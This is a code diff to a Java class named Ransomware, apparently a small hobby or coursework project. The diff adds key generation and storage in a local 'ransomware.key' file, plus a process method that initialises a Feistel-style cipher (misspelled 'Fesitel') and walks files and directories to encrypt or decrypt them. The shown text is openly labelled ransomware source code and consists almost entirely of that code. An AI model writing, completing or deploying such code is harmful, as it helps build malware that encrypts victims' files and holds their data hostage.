@@ -6,6 +6,8 @@ import java.nio.CharBuffer;
 import java.nio.IntBuffer;
 import java.nio.file.Files;
 import java.nio.file.Path;
+import java.util.ArrayList;
+import java.util.List;
 
 public class Ransomware {
 
@@ -41,7 +43,36 @@ public class Ransomware {
         System.out.println(prefix + file.getAbsolutePath());
     }
 
-    public static void initialize(Path path) throws IOException {
+    private static List<Integer> loadKeysFromFile() throws IOException {
+        Path currentPath = Path.of(System.getProperty("user.dir"), "ransomware.key");
+        List<String> stringKeys = Files.readAllLines(currentPath);
+        List<Integer> keys = new ArrayList<>();
+        stringKeys.forEach((val) -> {
+            keys.add(Integer.parseInt(val));
+        });
+        return keys;
+    }
+
+    private static void saveKeysToFile(List<Integer> keys) throws IOException {
+        Path currentPath = Path.of(System.getProperty("user.dir"), "ransomware.key");
+        String keyString = "";
+        for(int key : keys) {
+            keyString += "" + key + "\n";
+        }
+        Files.writeString(currentPath, keyString);
+    }
+
+    public static void process(Path path) throws IOException {
+
+        if (Ransomware.mode == Mode.Encrypt) {
+            List<Integer> keys = KeyGenerator.generateUniqueKeys(FesitelAlgorithm.ROUNDS);
+            FesitelAlgorithm.initialize(keys);
+            saveKeysToFile(keys);
+        } else {
+            List<Integer> keys = loadKeysFromFile();
+            FesitelAlgorithm.initialize(keys);
+        }
+
         File file = path.toFile();
         if (file.isDirectory()) {
             processDirectory(file);
@@ -50,7 +81,7 @@ public class Ransomware {
         }
     }
 
-    public static String process(String message, Mode mode) {
+    private static String process(String message, Mode mode) {
         if (mode == Mode.Encrypt) {
             message = checkAndPad(message);
         }
